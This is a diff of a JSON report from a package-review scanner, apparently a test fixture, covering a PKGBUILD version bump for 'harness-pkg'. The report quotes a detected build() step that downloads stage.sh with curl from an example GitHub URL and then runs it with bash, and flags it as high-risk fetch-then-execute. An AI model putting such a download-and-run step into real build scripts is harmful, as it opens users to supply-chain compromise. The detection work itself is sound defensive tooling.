@@ -22,7 +22,7 @@
       "chain": "curl -> bash stage.sh",
       "preserved": true,
       "reason": "",
-      "validator_version": "sha256:368bb45c32cc6123445b114f08f7e3b11774bd130049ec160f3ebbcc966b6025"
+      "validator_version": "sha256:7989a784ea740b8f6cec6fb024afd7cc6d5b7514d5b30f55ab51e76d2a393ec1"
     },
     "constraints": {
       "honored": true,
@@ -41,20 +41,86 @@
   },
   "status": "detected",
   "trustsight": {
-    "config_fingerprint": "sha256:4d29026f6b3d70bdb7c16f6ab53ffe28d01977497ced3fe95923bb4bf37ca9ff",
+    "config_fingerprint": "sha256:c4a1e81279bfff7fe9db5fe18eb455d83f0904168b09e78c93107c13ab67e541",
     "report": {
       "acknowledged_urls": [],
       "cached": false,
       "cached_at": "",
+      "change": {
+        "checkdependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "checksum_behavior": "checksum_added_or_changed",
+        "checksums": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "dependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "files": [
+          {
+            "hunks": [
+              1
+            ],
+            "old_path": "PKGBUILD",
+            "path": "PKGBUILD",
+            "status": "modified"
+          }
+        ],
+        "hosts_gained": [
+          "github.com"
+        ],
+        "hosts_lost": [],
+        "local_sources_gained": [],
+        "local_sources_lost": [],
+        "makedependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "optdependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "pgp_keys": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "reordered": false,
+        "sources": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "version": {
+          "moved": true,
+          "new_epoch": "",
+          "new_pkgrel": "1",
+          "new_pkgver": "1.0.1",
+          "old_epoch": "",
+          "old_pkgrel": "1",
+          "old_pkgver": "1.0.0",
+          "pkgver_changed": true
+        }
+      },
       "changes": [
         "pkgver 1.0.0 -> 1.0.1",
         "checksums added or changed",
         "source host added: github.com"
       ],
       "comparison_base": "",
-      "config_fingerprint": "sha256:4d29026f6b3d70bdb7c16f6ab53ffe28d01977497ced3fe95923bb4bf37ca9ff",
+      "config_fingerprint": "sha256:c4a1e81279bfff7fe9db5fe18eb455d83f0904168b09e78c93107c13ab67e541",
       "coverage_gaps": [
-        "tree_not_analyzed"
+        "tree_not_analyzed",
+        "ruleset_drifted"
       ],
       "coverage_gaps_carried": [],
       "dependencies": [],
@@ -129,7 +195,30 @@
       "old_commit": "",
       "old_version": "1.0.0",
       "package": "harness-pkg",
+      "partial_files": [],
       "required_by": [],
+      "resolution_coverage": {
+        "resolved_lines": 3,
+        "resolved_target_rules": [
+          "R001",
+          "R002",
+          "R003",
+          "R008",
+          "R012",
+          "R039",
+          "R040",
+          "R041",
+          "R042",
+          "R043",
+          "R044",
+          "R045",
+          "R055",
+          "R056",
+          "R057"
+        ],
+        "resolved_target_rules_fired": [],
+        "unresolved_lines": 0
+      },
       "review_profile": "default",
       "review_threshold": 20,
       "risk": "High",
@@ -253,6 +342,21 @@
         },
         {
           "evidence": {
+            "gap": "ruleset_drifted"
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "gap": "ruleset_drifted"
+          },
+          "reason": "Coverage gap: the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents",
+          "rule_id": "COVERAGE",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        },
+        {
+          "evidence": {
             "count": 1
           },
           "file": "",
@@ -279,9 +383,10 @@
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. modified PKGBUILD; added 1 source URL(s). Signals: Fetch Then Execute: build() downloads stage.sh and then executes it [H082]; build() fetches https://github.com/example/harness-baseline/stage.sh from outside the declared source array [H016]; Uses curl in PKGBUILD: +  curl -fsSL https://github.com/example/harness-baseline/stage.sh -o stage.sh [R010]. Review the diff before building.",
+      "unresolved_assignments": [],
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. The result describes what was examined, not the whole change. Version bump. modified PKGBUILD; added 1 source URL(s). Signals: Fetch Then Execute: build() downloads stage.sh and then executes it [H082]; build() fetches https://github.com/example/harness-baseline/stage.sh from outside the declared source array [H016]; Uses curl in PKGBUILD: +  curl -fsSL https://github.com/example/harness-baseline/stage.sh -o stage.sh [R010]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 850
+    "wall_clock_ms": 886
   }
 }
